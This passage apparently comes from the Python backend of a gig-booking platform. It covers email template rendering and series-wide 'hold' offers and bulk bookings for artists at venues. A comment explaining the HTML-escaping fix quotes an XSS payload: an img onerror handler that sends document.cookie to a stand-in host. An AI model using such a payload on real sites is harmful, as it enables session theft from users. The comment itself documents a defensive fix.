        users = get_all_entity_users(db, "venue", venue_id)
        for u in users:
            create_notification(db, u["user_id"], "hold_update", title, body, gig_id=gig_id)
        db.commit()
    except Exception as e:
        logger.warning(f"[HOLD] in-app notification failed for venue={venue_id}: {e}")


def _dispatch_template(db, to_email: str, template_key: str, vars: dict):
    """Render a template from the email_templates table + send via SMTP.
    Logs failures loudly so the existing log→email alert pipeline can
    pick them up."""
    from sqlalchemy import text
    try:
        tpl = db.execute(
            text("SELECT subject, body FROM email_templates WHERE template_key = :k"),
            {"k": template_key}
        ).mappings().first()
        if not tpl:
            logger.error(f"[HOLD] template missing: {template_key}")
            return
        subject = _render(tpl["subject"], vars)
        body = _render(tpl["body"], vars)
        from backend.scheduler import get_smtp_settings, send_email
        # SMTP settings reader wants a raw cursor. Jul 1 2026 Postgres R1:
        # use get_db_connection so this works on both engines.
        from backend.db import get_db_connection
        rc = get_db_connection()
        try:
            smtp = get_smtp_settings(rc.cursor())
            if not smtp:
                logger.error(f"[HOLD] SMTP not configured — can't send {template_key} to {to_email}")
                return
            ok = send_email(smtp, to_email, subject, body)
            if not ok:
                logger.error(f"[HOLD] SMTP send FAILED for {template_key} → {to_email}")
        finally:
            rc.close()
    except Exception as e:
        logger.error(f"[HOLD] dispatch failed for {template_key} → {to_email}: {e}")


# Tiny Mustache-style renderer. Supports {{var}} and {{#var}}…{{/var}}
# blocks for conditional sections (used by templates like {{#title}}…).
#
# HTML-escape by default (Jul 2026 full-site audit — E-C1): every hold
# email template body carries `{{artist_name}}` / `{{venue_name}}` /
# `{{title}}` interpolations that reach a real inbox. Without escaping,
# an artist named `<img src=x onerror=fetch('//evil?c='+document.cookie)>`
# rendered live in every venue's inbox on accept/decline. Keys ending
# in `_html` (e.g. `body_html`, `cta_html`) skip escaping — that's the
# opt-out for a value the caller has already sanitized / composed.
_HTML_SAFE_UNESCAPED_SUFFIXES = ("_html", "_url", "_href")

def _escape_html(s: str) -> str:
    return (str(s)
            .replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            .replace('"', "&quot;").replace("'", "&#39;"))

def _render(template: str, vars: dict) -> str:
    if template is None:
        return ""
    out = template
    # Conditional blocks first so {{var}} substitutions inside are
    # respected.
    def _block(match):
        key = match.group(1)
        inner = match.group(2)
        v = vars.get(key)
        if v:
            return _render(inner, vars)
        return ""
    out = re.sub(r"\{\{#([a-zA-Z0-9_]+)\}\}([\s\S]*?)\{\{/\1\}\}", _block, out)
    for k, v in vars.items():
        if v is None:
            val = ""
        elif any(k.endswith(sfx) for sfx in _HTML_SAFE_UNESCAPED_SUFFIXES):
            # Caller marked this key as pre-composed/URL — trust it.
            val = str(v)
        else:
            val = _escape_html(v)
        out = out.replace("{{" + k + "}}", val)
    return out


def _fmt_time(t):
    """'19:00' or '19:00:00' → '7:00 PM'. Returns input on parse error."""
    if not t:
        return ""
    s = str(t).strip()
    if not s or ":" not in s:
        return s
    parts = s.split(":")
    try:
        h = int(parts[0])
        m = parts[1] if len(parts) > 1 else "00"
        ampm = "PM" if h >= 12 else "AM"
        h12 = h % 12 or 12
        return f"{h12}:{m} {ampm}"
    except Exception:
        return s


# ──────────────────────────────────────────────────────────────────────
# Series-level Hold (Jul 2026 — Phase 5)
# ──────────────────────────────────────────────────────────────────────
#
# Sibling rotation that operates ACROSS a recurring_group_id instead of
# per-gig. Reuses the same gig_waitlist table: every gig instance in the
# series has the same artist_id list staged at gig-create time
# (defer_kickoff=True so per-gig rotations don't fire). The series-start
# endpoint then fans out ONE bundled offer per artist — same offer_token
# value written to every row that artist owns in the series, so a single
# email + single modal covers all dates.
#
# Per-artist-type parallelism is preserved within the series: a series
# whose gigs mix Live Band + DJ slots fires offers to LB1 AND DJ1 at
# the same time, each seeing only the dates with slots matching their
# type that they could actually book.

def start_series_hold(db, recurring_group_id: str,
                      send_email: Optional[bool] = None) -> list:
    """Kickoff endpoint for a series hold. Called once after the
    frontend has POSTed every gig instance of a recurring series
    (with hold_artist_ids set on each). Fires the FIRST round of
    bundled offers — one per artist-type bucket, parallel.

    Returns the list of artist_ids offered this call. Empty list if
    every bucket is in-flight or exhausted.
    """
    from sqlalchemy import text
    # Determine the union of open slot artist_types across the series.
    # One bucket per type, mirroring the single-gig parallel rotation.
    open_types = db.execute(
        text("""SELECT DISTINCT gs.artist_type
                FROM gig_slots gs
                JOIN gigs g ON g.id = gs.gig_id
                WHERE g.recurring_group_id = :rgid
                  AND gs.status = 'open'
                  AND gs.artist_type IS NOT NULL"""),
        {"rgid": recurring_group_id}
    ).mappings().all()
    if not open_types:
        return []
    offered = []
    for ot in open_types:
        aid = _send_next_series_offer_for_type(
            db, recurring_group_id, ot["artist_type"], send_email=send_email
        )
        if aid:
            offered.append(aid)
    return offered


def _send_next_series_offer_for_type(db, recurring_group_id: str,
                                     artist_type: str,
                                     send_email: Optional[bool] = None) -> Optional[int]:
    """Advance ONE bucket (one artist_type) of a series hold rotation.

    Looks for an in-flight offer for an artist of this type across the
    series — if found, skip (already running). Otherwise pick the
    lowest-position artist of this type with no in-flight offer and
    no series-wide decline, generate a shared offer_token, stamp every
    gig_waitlist row that artist owns in the series with it, and fire
    one bundled email.

    Returns the artist_id offered, or None if the bucket is exhausted
    (no remaining candidates of this type in the series).
    """
    from sqlalchemy import text
    # In-flight check: any artist of this type with an unresolved offer
    # on ANY gig in the series? Series tokens are shared across the
    # artist's rows, so checking just one of their rows is enough.
    in_flight = db.execute(
        text("""SELECT wl.artist_id FROM gig_waitlist wl
                JOIN artists a ON a.id = wl.artist_id
                JOIN gigs g ON g.id = wl.gig_id
                WHERE g.recurring_group_id = :rgid
                  AND wl.source = 'hold'
                  AND wl.offer_sent = 1 AND wl.offer_declined = 0
                  AND a.artist_type = :t
                LIMIT 1"""),
        {"rgid": recurring_group_id, "t": artist_type}
    ).first()
    if in_flight:
        return None
    # Next un-offered artist of this type. Position is set per-row at
    # gig create time but is the same across the series (every gig got
    # the same artist_ids list in the same order). We pick by MIN
    # position to be safe.
    row = db.execute(
        text("""SELECT wl.artist_id, MIN(wl.position) as min_pos
                FROM gig_waitlist wl
                JOIN artists a ON a.id = wl.artist_id
                JOIN gigs g ON g.id = wl.gig_id
                WHERE g.recurring_group_id = :rgid
                  AND wl.source = 'hold'
                  AND wl.offer_sent = 0 AND wl.offer_declined = 0
                  AND a.artist_type = :t
                GROUP BY wl.artist_id
                ORDER BY min_pos ASC LIMIT 1"""),
        {"rgid": recurring_group_id, "t": artist_type}
    ).mappings().first()
    if not row:
        # YELLOW #4 audit: bucket exhausted — notify the venue. Only
        # fire the email if EVERY other bucket is also exhausted (no
        # in-flight offers, no remaining candidates) so the venue
        # gets one "series fully exhausted" email at the right time.
        _any_active = db.execute(
            text("""SELECT 1 FROM gig_waitlist wl
                    JOIN gigs g ON g.id = wl.gig_id
                    WHERE g.recurring_group_id = :rgid
                      AND wl.source = 'hold'
                      AND wl.offer_sent = 1 AND wl.offer_declined = 0
                    LIMIT 1"""),
            {"rgid": recurring_group_id}
        ).first()
        _any_queued = db.execute(
            text("""SELECT 1 FROM gig_waitlist wl
                    JOIN gigs g ON g.id = wl.gig_id
                    WHERE g.recurring_group_id = :rgid
                      AND wl.source = 'hold'
                      AND wl.offer_sent = 0 AND wl.offer_declined = 0
                    LIMIT 1"""),
            {"rgid": recurring_group_id}
        ).first()
        if not _any_active and not _any_queued:
            try:
                _mark_series_exhausted_and_notify(db, recurring_group_id)
            except Exception as _e:
                logger.warning(f"[SERIES_HOLD] exhausted-notify failed rgid={recurring_group_id}: {_e}")
        return None
    artist_id = int(row["artist_id"])
    # Email/window preferences come from any gig in the series (they
    # were set at create time and are uniform). Grab the earliest.
    gig_pref = db.execute(
        text("""SELECT COALESCE(hold_offer_window_hours, 24) as win,
                       COALESCE(hold_email_artists, 1) as email_on,
                       id as anchor_gig_id
                FROM gigs WHERE recurring_group_id = :rgid
                ORDER BY date ASC LIMIT 1"""),
        {"rgid": recurring_group_id},
    ).mappings().first()
    win = gig_pref["win"] if gig_pref else 24
    if send_email is None:
        send_email = bool(int(gig_pref["email_on"] or 0)) if gig_pref else True
    # Shared series offer token — written to EVERY row this artist owns
    # in the series. Email/modal lookups resolve token -> all rows.
    token = secrets.token_urlsafe(24)
    # Python-computed expires_at (#20 audit fix: Postgres compat).
    from datetime import datetime as _dt2, timedelta as _td2
    _expires_at = (_dt2.utcnow() + _td2(hours=int(win or 24))).strftime("%Y-%m-%d %H:%M:%S")
    db.execute(
        text("""UPDATE gig_waitlist
                SET offer_sent = 1,
                    offer_sent_at = CURRENT_TIMESTAMP,
                    offer_expires_at = :exp,
                    offer_token = :tok,
                    notified = 1,
                    notified_at = CURRENT_TIMESTAMP
                WHERE artist_id = :aid
                  AND source = 'hold'
                  AND offer_sent = 0
                  AND offer_declined = 0
                  AND gig_id IN (
                    SELECT id FROM gigs WHERE recurring_group_id = :rgid
                  )"""),
        {"aid": artist_id, "tok": token, "exp": _expires_at,
         "rgid": recurring_group_id},
    )
    db.commit()
    logger.info(
        f"[SERIES_HOLD] rgid={recurring_group_id} offered to artist={artist_id} "
        f"bucket={artist_type!r} token={token[:8]}..."
    )
    if send_email:
        try:
            _send_series_hold_offer_email(
                db, recurring_group_id=recurring_group_id,
                artist_id=artist_id, token=token, is_reminder=False
            )
        except Exception as _e:
            logger.error(
                f"[SERIES_HOLD] email failed rgid={recurring_group_id} "
                f"artist={artist_id}: {_e}"
            )
    return artist_id


def _list_artist_other_bookings_at_venue(db, venue_id: int, artist_id: int,
                                          exclude_recurring_group_id: str = None):
    """Return this artist's existing bookings at this venue (any date),
    EXCLUDING the given recurring_group_id. Used by the series-hold
    modal to grey out dates within the venue's freq window of a pre-
    existing one-off booking the artist already has on the calendar.

    Each entry: {gig_id, date}. Includes booked/pending-contract/
    awaiting-venue-contract/pending-venue-approval states (any state
    that holds the slot).
    """
    from sqlalchemy import text
    params = {"vid": venue_id, "aid": artist_id}
    excl = ""
    if exclude_recurring_group_id:
        excl = " AND (g.recurring_group_id IS NULL OR g.recurring_group_id != :rgid)"
        params["rgid"] = exclude_recurring_group_id
    # Jul 2026 refactor: dropped `g.artist_id = :aid` OR-leg.
    rows = db.execute(
        text(f"""SELECT DISTINCT g.id as gig_id, g.date
                FROM gigs g
                JOIN gig_slots gs ON gs.gig_id = g.id AND gs.artist_id = :aid
                WHERE g.venue_id = :vid
                  {excl}
                  AND gs.status IN ('booked','pending_contract','awaiting_venue_contract','pending_venue_approval')
                ORDER BY g.date ASC"""),
        params
    ).mappings().all()
    return [{"gig_id": r["gig_id"], "date": str(r["date"])[:10] if r["date"] else None}
            for r in rows]


def _list_series_eligible_gigs(db, recurring_group_id: str, artist_id: int):
    """Return open slots in the series this artist could book. Excludes
    slots already booked (by anyone) and slots whose artist_type +
    band_formats + styles don't match this artist (per
    _artist_matches_slot). Used by both the bundled offer email and
    the series-hold accept modal.

    Each entry: {gig_id, date, slot_id, slot_number, artist_type,
    deal_type, door_pct, guarantee_cents, pay, start_time, end_time,
    apply_override, freq_blocked, blockers}.
    `freq_blocked` flags whether picking THIS slot would violate the
    venue's frequency rule given the artist's existing other bookings
    at this venue (not other picks in the modal — that's frontend).
    """
    from sqlalchemy import text
    artist = db.execute(
        text("SELECT id, artist_type, band_formats, styles FROM artists WHERE id = :aid"),
        {"aid": artist_id}
    ).mappings().first()
    if not artist:
        return []
    slot_rows = db.execute(
        text("""SELECT gs.id as slot_id, gs.gig_id, gs.slot_number, gs.artist_type,
                       gs.band_formats, gs.styles, gs.deal_type, gs.door_pct,
                       gs.guarantee_cents, gs.pay, gs.start_time, gs.end_time,
                       COALESCE(gs.apply_override, 0) as apply_override,
                       g.date, g.venue_id
                FROM gig_slots gs
                JOIN gigs g ON g.id = gs.gig_id
                WHERE g.recurring_group_id = :rgid
                  AND gs.status = 'open'
                ORDER BY g.date ASC, gs.slot_number ASC"""),
        {"rgid": recurring_group_id}
    ).mappings().all()
    out = []
    for r in slot_rows:
        if not _artist_matches_slot(artist, r):
            continue
        eff_pay = _effective_pay_for_artist(db, dict(r), r["venue_id"], artist_id)
        out.append({
            "gig_id": r["gig_id"],
            "slot_id": r["slot_id"],
            "slot_number": r["slot_number"],
            "date": str(r["date"])[:10] if r["date"] else None,
            "start_time": r["start_time"],
            "end_time": r["end_time"],
            "artist_type": r["artist_type"],
            "deal_type": r["deal_type"] or "flat",
            "door_pct": int(r["door_pct"] or 0),
            "guarantee_cents": int(r["guarantee_cents"] or 0),
            "pay": float(eff_pay or 0),
            "apply_override": bool(int(r["apply_override"] or 0)),
        })
    return out


def respond_to_series_hold_offer(db, token: str, action: str,
                                  slot_picks: Optional[list] = None,
                                  signature_name: Optional[str] = None,
                                  signature_ip: Optional[str] = None):
    """Bulk-book or decline a series hold offer via its shared token.

    action='accept': slot_picks = [{gig_id, slot_id}, ...]. Books each
        atomically (contracts created if venue requires). Unselected
        eligible dates get marked declined on this artist's behalf.
        Advances the series rotation for this artist_type bucket.
    action='decline': marks every row this artist owns in the series
        as declined. Advances the bucket.

    Returns {ok, message, booked_count?, contract_status?}.
    """
    from sqlalchemy import text
    rows = db.execute(
        text("""SELECT wl.id as wl_id, wl.gig_id, wl.artist_id,
                       wl.offer_expires_at, wl.offer_declined,
                       g.recurring_group_id
                FROM gig_waitlist wl
                JOIN gigs g ON g.id = wl.gig_id
                WHERE wl.offer_token = :tok AND wl.source = 'hold'"""),
        {"tok": token}
    ).mappings().all()
    if not rows:
        return {"ok": False, "message": "Offer not found."}
    # Sanity: all rows should belong to the same artist + series
    artist_id = rows[0]["artist_id"]
    rgid = rows[0]["recurring_group_id"]
    if not rgid:
        return {"ok": False, "message": "Token doesn't belong to a series hold."}
    # Already-responded short-circuit. Series rows are stamped together,
    # so checking the first row's offer_declined flag is enough.
    if int(rows[0]["offer_declined"] or 0) == 1:
        return {"ok": False, "message": "This offer has already been responded to."}
    # Expiry check — pick the latest offer_expires_at; if past, decline.
    from datetime import datetime as _dt
    try:
        max_exp = max(
            _dt.strptime(str(r["offer_expires_at"]).replace("T", " ").split(".")[0],
                         "%Y-%m-%d %H:%M:%S")
            for r in rows if r["offer_expires_at"]
        )
        if _dt.utcnow() > max_exp:
            db.execute(
                text("""UPDATE gig_waitlist SET offer_declined = 1
                        WHERE offer_token = :tok"""),
                {"tok": token}
            )
            db.commit()
            # #15 audit fix + YELLOW #2: series-aware venue notification
            # so the email says "the series of N dates" not "the gig on D".
            try:
                _notify_venue_decline_series(db, recurring_group_id=rgid,
                                              artist_id=artist_id, reason="expired")
            except Exception as _ne:
                logger.warning(f"[SERIES_HOLD] expiry notify-venue failed: {_ne}")
            _advance_series_bucket_for_artist(db, rgid, artist_id)
            return {"ok": False, "message": "This offer has expired."}
    except Exception:
        pass

    if action == "decline":
        db.execute(
            text("""UPDATE gig_waitlist SET offer_declined = 1,
                        offer_expires_at = CURRENT_TIMESTAMP
                    WHERE offer_token = :tok"""),
            {"tok": token}
        )
        db.commit()
        # #14 + YELLOW #2 audit: series-aware venue notification.
        try:
            _notify_venue_decline_series(db, recurring_group_id=rgid,
                                          artist_id=artist_id, reason="declined")
        except Exception as _ne:
            logger.warning(f"[SERIES_HOLD] decline notify-venue failed: {_ne}")
        _advance_series_bucket_for_artist(db, rgid, artist_id)
        return {"ok": True, "message": "Thanks — we've let the venue know.",
                "booked_count": 0}

    if action != "accept":
        return {"ok": False, "message": "Unknown action."}

    picks = slot_picks or []
    if not picks:
        return {"ok": False, "message": "Pick at least one date or hit Decline All."}

    # Validate every pick is in this artist's eligible set
    eligible = {(int(e["gig_id"]), int(e["slot_id"]))
                for e in _list_series_eligible_gigs(db, rgid, artist_id)}
    invalid = [(p.get("gig_id"), p.get("slot_id")) for p in picks
               if (int(p.get("gig_id") or 0), int(p.get("slot_id") or 0)) not in eligible]
    if invalid:
        return {"ok": False,
                "message": "Some picks are no longer available — please refresh and try again."}

    # Per-pick frequency / overlap gates. We accept whatever frontend
    # selected but the per-slot booking gates fire downstream too.
    booked_ids = []
    failed = []
    venue_requires_contract = False
    try:
        from sqlalchemy import text as _t
        # Just need a venue from one of the gigs.
        any_gig = db.execute(
            _t("SELECT venue_id FROM gigs WHERE recurring_group_id = :rgid LIMIT 1"),
            {"rgid": rgid}
        ).mappings().first()
        if any_gig:
            vc = db.execute(
                _t("""SELECT 1 FROM venue_contracts
                      WHERE venue_id = :vid AND is_active = 1 AND require_for_booking = 1
                      LIMIT 1"""),
                {"vid": any_gig["venue_id"]}
            ).first()
            venue_requires_contract = bool(vc)
    except Exception:
        pass

    if venue_requires_contract and not signature_name:
        return {"ok": False,
                "message": "Signature required — venue contract on booking.",
                "needs_signature": True,
                "picks": picks}

    # ATOMIC LOOP (Jul 2026 audit RED #5+#6): book each pick by writing
    # ONLY the slot UPDATE + gig_contracts row + gigs.status promotion
    # inside the loop. NO transaction creation, NO emails, NO
    # notifications inside the helper — those would commit before
    # later picks succeeded, breaking atomicity. Collect post-commit
    # actions; replay them after one final db.commit() succeeds.
    post_actions = []
    try:
        for p in picks:
            _gid = int(p["gig_id"]); _sid = int(p["slot_id"])
            ok, msg, action = _book_one_series_pick(
                db, gig_id=_gid, slot_id=_sid, artist_id=artist_id,
                signature_name=signature_name, signature_ip=signature_ip,
                rgid=rgid, already_booked_in_batch=[a[0] for a in booked_ids],
            )
            if not ok:
                raise RuntimeError(f"Booking failed for gig {_gid} slot {_sid}: {msg}")
            booked_ids.append((_gid, _sid))
            if action:
                post_actions.append(action)
        # Mark unselected eligible dates as declined for THIS artist —
        # they're saying "I'll do these but not those."
        picked_set = {(g, s) for g, s in booked_ids}
        for e in eligible:
            if e in picked_set:
                continue
            db.execute(
                text("""UPDATE gig_waitlist SET offer_declined = 1,
                            offer_expires_at = CURRENT_TIMESTAMP
                        WHERE gig_id = :gid AND artist_id = :aid AND source = 'hold'"""),
                {"gid": e[0], "aid": artist_id}
            )
        # Mark this artist's offer rows as consumed (the booked ones
        # are still source='hold' but their slot is booked — keep them
        # for audit but flip offer_declined to clear the in-flight check)
        db.execute(
            text("""UPDATE gig_waitlist SET offer_declined = 1
                    WHERE offer_token = :tok"""),
            {"tok": token}
        )
        db.commit()
    except Exception as e:
        db.rollback()
        logger.error(f"[SERIES_HOLD] bulk-book failed token={token[:8]}: {e}")
        return {"ok": False, "message": str(e)}

    # ── POST-COMMIT: only fires when EVERY pick succeeded ──────────────
    # Transactions, emails, and notifications fan out here so a mid-loop
    # failure can't leave orphan transactions / sent emails / activity-
    # center entries for picks that got rolled back.
    for action in post_actions:
        _gid = action["gig_id"]; _sid = action["slot_id"]
        pay = action["pay"]; gdate = action["gig_date"]; vid = action["venue_id"]
        ctype = action["mode"]  # 'no_contract' | 'contract'
        if ctype == "no_contract":
            # Money trail
            try:
                from backend.routes.gigs import _create_booking_transaction
                _create_booking_transaction(db, _gid, vid, artist_id, pay, gdate, slot_id=_sid)
            except Exception as _txe:
                logger.error(f"[SERIES_HOLD] _create_booking_transaction failed gig={_gid} slot={_sid}: {_txe}")
            # Booking confirmation emails
            try:
                from backend.services.email_dispatch import send_booking_emails
                send_booking_emails(db, _gid, slot_id=_sid)
            except Exception as _ee:
                logger.warning(f"[SERIES_HOLD] booking email failed gig={_gid} slot={_sid}: {_ee}")
            # Activity Center
            try:
                from backend.services.notification_service import notify_gig_booked
                _v = db.execute(text("SELECT venue_name FROM venues WHERE id = :vid"), {"vid": vid}).scalar() or ""
                _a = db.execute(text("SELECT name FROM artists WHERE id = :aid"), {"aid": artist_id}).scalar() or ""
                notify_gig_booked(db, {
                    "venue_name": _v, "artist_name": _a,
                    "date": gdate, "start_time": action.get("start_time"),
                }, _gid, vid, artist_id)
            except Exception as _ne:
                logger.warning(f"[SERIES_HOLD] activity notify failed gig={_gid}: {_ne}")
        elif ctype == "contract":
            # Artist signed; venue needs to countersign. RED #3 fix:
            # fire contract-sign emails + activity notifications so the
            # venue knows there's a contract waiting.
            try:
                from backend.routes.contracts import _create_booking_notifications
                _create_booking_notifications(db, _gid, vid, artist_id, "artist_signed")
            except Exception as _ne:
                logger.warning(f"[SERIES_HOLD] contract notify failed gig={_gid}: {_ne}")
            try:
                from backend.services.email_dispatch import send_contract_sign_email
                send_contract_sign_email(db, vid, artist_id, _gid, gdate)
            except Exception as _ee:
                logger.warning(f"[SERIES_HOLD] contract sign email failed gig={_gid}: {_ee}")

    # Advance the bucket
    _advance_series_bucket_for_artist(db, rgid, artist_id)
    return {"ok": True,
            "booked_count": len(booked_ids),
            "message": f"Booked {len(booked_ids)} gig(s). The venue will be notified."}


def _book_one_series_pick(db, gig_id: int, slot_id: int, artist_id: int,
                           signature_name: Optional[str], signature_ip: Optional[str],
                           rgid: str,
                           already_booked_in_batch: Optional[list] = None):
    """Book a single (gig, slot) for an artist as part of a series-hold
    accept (Jul 2026 final audit pass — atomic loop).

    Performs ONLY the database state changes that need to be inside the
    atomic transaction: slot UPDATE, contract row INSERT, gig.status
    promotion. Does NOT call _create_booking_transaction, send emails,
    or fire notifications — those are post-commit actions returned in
    the third tuple slot so the caller can replay them only if the
    whole loop commits.

    Returns (ok: bool, message: str, post_action: dict | None).
    post_action is None when no follow-up is needed (e.g. failure).
    """
    from sqlalchemy import text
    from datetime import datetime as _dt, timedelta as _td
    # Re-check slot is still open + matches artist (defensive, the
    # eligible-set check in respond_to_series_hold_offer already runs
    # but races happen).
    slot = db.execute(
        text("""SELECT id, status, gig_id, artist_type, band_formats, styles,
                       pay, deal_type, door_pct, guarantee_cents,
                       COALESCE(apply_override, 0) as apply_override,
                       start_time, end_time
                FROM gig_slots WHERE id = :sid AND gig_id = :gid"""),
        {"sid": slot_id, "gid": gig_id}
    ).mappings().first()
    if not slot:
        return False, "Slot not found.", None
    if slot["status"] != "open":
        return False, "Slot was just taken — please refresh.", None
    artist = db.execute(
        text("SELECT id, artist_type, band_formats, styles, user_id FROM artists WHERE id = :aid"),
        {"aid": artist_id}
    ).mappings().first()
    if not artist:
        return False, "Artist not found.", None
    if not _artist_matches_slot(artist, slot):
        return False, "Artist doesn't match the slot's type.", None

    gig = db.execute(
        text("SELECT id, venue_id, date, start_time, end_time, frequency_exempt, pay FROM gigs WHERE id = :gid"),
        {"gid": gig_id}
    ).mappings().first()
    if not gig:
        return False, "Gig not found.", None

    # Contract requirement check (#6 audit fix: refuse pdf-based types)
    vc_row = db.execute(
        text("""SELECT id, contract_type, require_for_booking
                FROM venue_contracts
                WHERE venue_id = :vid AND is_active = 1
                ORDER BY id DESC LIMIT 1"""),
        {"vid": gig["venue_id"]}
    ).mappings().first()
    requires_contract = bool(vc_row and vc_row.get("require_for_booking"))
    contract_type = (vc_row["contract_type"] if vc_row else None) or "auto_generated"
    if requires_contract and contract_type in ("pdf_upload", "per_gig_pdf"):
        return False, (
            "This venue requires a PDF contract that can't be batch-signed. "
            "Please open the individual gig and use its Book button to download "
            "and sign the PDF for each date."
        ), None
    if requires_contract and not signature_name:
        return False, "Signature required.", None

    # #4 audit fix: per-gig dedupe — artist can't already have another
    # slot in-flight on this gig (per book_slot:4626-4633 rule).
    # Includes the batch context: a prior pick in THIS loop iteration
    # has already booked another slot on this gig.
    if (already_booked_in_batch or []) and gig_id in (already_booked_in_batch or []):
        return False, "Already picked another slot on this gig in this batch — one slot per artist per gig.", None
    existing = db.execute(
        text("""SELECT id FROM gig_slots
                WHERE gig_id = :gid AND artist_id = :aid AND id != :sid
                  AND status IN ('booked','pending_venue_approval','pending_contract','awaiting_venue_contract')"""),
        {"gid": gig_id, "aid": artist_id, "sid": slot_id}
    ).first()
    if existing:
        return False, "Already booked on a different slot of this gig — only one slot per artist per gig.", None

    # Pre-book gates. YELLOW #6 audit fix: skip _run_prebooking_checks
    # because its frequency-check inside the loop would block pick N+1
    # against pick N just inserted. The modal's frequency-greying logic
    # (and the existing-bookings check in get_series_hold_offer) is the
    # source of truth here. We still run the OTHER gates individually:
    # ban / W-9 / blackout / time-overlap — they're per-pick correct
    # and don't depend on within-batch state.
    try:
        # Ban check
        if db.execute(
            text("SELECT 1 FROM venue_artist_bans WHERE venue_id=:vid AND artist_id=:aid"),
            {"vid": gig["venue_id"], "aid": artist_id}
        ).first():
            return False, "You are not permitted to book at this venue.", None
        # W-9 if required by venue (calendar-year)
        _w9 = db.execute(
            text("SELECT require_w9 FROM venue_tax_settings WHERE venue_id = :vid"),
            {"vid": gig["venue_id"]}
        ).first()
        if _w9 and _w9[0]:
            from backend.utils import get_venue_timezone as _gvt
            _cy = _dt.now(_gvt(db, gig["venue_id"])).year
            _w9r = db.execute(
                text("SELECT tax_year FROM w9_forms WHERE entity_type='artist' AND entity_id=:aid ORDER BY tax_year DESC LIMIT 1"),
                {"aid": artist_id}
            ).first()
            if not _w9r or _w9r[0] < _cy:
                return False, "This venue requires an up-to-date W-9 on file before booking.", None
        # Artist blackout
        _bo = db.execute(
            text("""SELECT reason FROM artist_availability
                    WHERE artist_id = :aid
                      AND date(:d) BETWEEN date(blackout_start) AND date(blackout_end)
                    LIMIT 1"""),
            {"aid": artist_id, "d": str(gig["date"])[:10]}
        ).first()
        if _bo:
            return False, f"You have a blackout on this date: {_bo[0] or 'unavailable'}", None
        # Cross-venue time overlap
        from backend.routes.gigs import _enforce_no_artist_time_overlap as _overlap
        _overlap(db, artist_id, gig_id, gig["venue_id"], str(gig["date"])[:10],
                 slot.get("start_time"), slot.get("end_time"))
    except Exception as _ge:
        _msg = getattr(_ge, "detail", None) or str(_ge)
        return False, f"{_msg}", None

    # YELLOW #5 audit fix: HARD-BLOCK on missing Stripe Connect.
    # Without it the slot books but the payout will never transfer.
    # Test Mode removed (Jul 1 2026): hard-blocks unconditionally.
    try:
        stripe_ok = db.execute(
            text("""SELECT stripe_connect_onboarding_complete
                    FROM entity_payment_settings
                    WHERE entity_type='artist' AND entity_id=:aid"""),
            {"aid": artist_id}
        ).scalar()
        if not stripe_ok:
            return False, ("Your payout account isn't set up yet — connect Stripe in your "
                           "settings before accepting this offer."), None
    except Exception:
        pass

    # #22 audit fix: write BOTH guarantee_cents and pay for door deals
    # so _create_booking_transaction's door-deal branch picks up the
    # override. Mirror legacy respond_to_hold_offer pattern (gig_hold.py:472-478).
    eff_pay = _effective_pay_for_artist(db, dict(slot), gig["venue_id"], artist_id)
    is_door = (slot.get("deal_type") or "flat").lower() == "door"
    if is_door and int(slot.get("apply_override") or 0) == 1:
        # Door + opted-in override: bump guarantee_cents to override floor.
        eff_g = int(round(float(eff_pay or 0) * 100))
        slot_update_sql = """UPDATE gig_slots
                             SET artist_id = :aid, status = :sst, pay = :pay,
                                 guarantee_cents = :gc
                             WHERE id = :sid AND status = 'open'"""
        slot_params_extra = {"gc": eff_g}
    else:
        slot_update_sql = """UPDATE gig_slots
                             SET artist_id = :aid, status = :sst, pay = :pay
                             WHERE id = :sid AND status = 'open'"""
        slot_params_extra = {}

    new_status = "awaiting_venue_contract" if requires_contract else "booked"
    _res = db.execute(
        text(slot_update_sql),
        {"aid": artist_id, "sst": new_status, "pay": float(eff_pay or 0),
         "sid": slot_id, **slot_params_extra}
    )
    # If the WHERE status='open' guard didn't match, someone else grabbed
    # this slot in the racewindow — bail. (M from the audit.)
    if (_res.rowcount or 0) == 0:
        # Helper contract is (ok, msg, post_action); caller unpacks 3-tuple.
        return False, "Slot was just taken — please refresh.", None

    # YELLOW #1 audit fix: clear ancillary state on the parent gig
    # (radius_blast_token, last_cancelled_artist_id) so a pre-hold
    # blast doesn't leak into this booking.
    db.execute(
        text("""UPDATE gigs
                SET radius_blast_token = NULL,
                    last_cancelled_artist_id = NULL
                WHERE id = :gid"""),
        {"gid": gig_id}
    )

    # Insert contract row if needed (auto_generated path).
    # RED #1, #2 audit fixes: pass correct venue_id + slot_id to
    # generate_auto_contract, stamp hold_expires_at (48h countersign
    # deadline mirroring the canonical per-gig flow), and set the gig-
    # level contract_hold_artist_id / contract_hold_expires_at so the
    # expired-holds sweep can reap stalled contracts.
    if requires_contract:
        try:
            from backend.routes.contracts import generate_auto_contract
            body = generate_auto_contract(db, gig_id, gig["venue_id"], artist_id, slot_id=slot_id)
        except Exception as _ge:
            logger.warning(f"[SERIES_HOLD] generate_auto_contract failed gig={gig_id}: {_ge}")
            body = ""
        countersign_deadline = (_dt.utcnow() + _td(hours=48)).strftime("%Y-%m-%d %H:%M:%S")
        db.execute(
            text("""INSERT INTO gig_contracts
                      (gig_id, venue_contract_id, venue_id, artist_id, contract_type,
                       rendered_body, status, artist_signature_name,
                       artist_signature_date, artist_signature_ip,
                       hold_expires_at, created_at)
                    VALUES
                      (:gid, :vcid, :vid, :aid, :ct, :body, 'artist_signed',
                       :sig, CURRENT_TIMESTAMP, :ip, :hexp, CURRENT_TIMESTAMP)"""),
            {"gid": gig_id, "vcid": (vc_row["id"] if vc_row else None),
             "vid": gig["venue_id"], "aid": artist_id,
             "ct": contract_type, "body": body,
             "sig": signature_name, "ip": signature_ip or "",
             "hexp": countersign_deadline}
        )
        # Also set the gig-level contract hold so the canonical
        # _cleanup_expired_holds_impl can reap the booking if the venue
        # ignores the countersign emails for 48h.
        db.execute(
            text("""UPDATE gigs
                    SET contract_hold_artist_id = :aid,
                        contract_hold_expires_at = :hexp
                    WHERE id = :gid"""),
            {"aid": artist_id, "hexp": countersign_deadline, "gid": gig_id}
        )

    # gig.status promotion. Only flip if all slots are no longer 'open'.
    remaining_open = db.execute(
        text("SELECT COUNT(*) FROM gig_slots WHERE gig_id = :gid AND status = 'open'"),
        {"gid": gig_id}
    ).scalar() or 0
    if remaining_open == 0:
        # Promote to booked (or awaiting_venue_contract if any slot
        # is still mid-contract).
        any_pending = db.execute(
            text("""SELECT 1 FROM gig_slots
                    WHERE gig_id = :gid
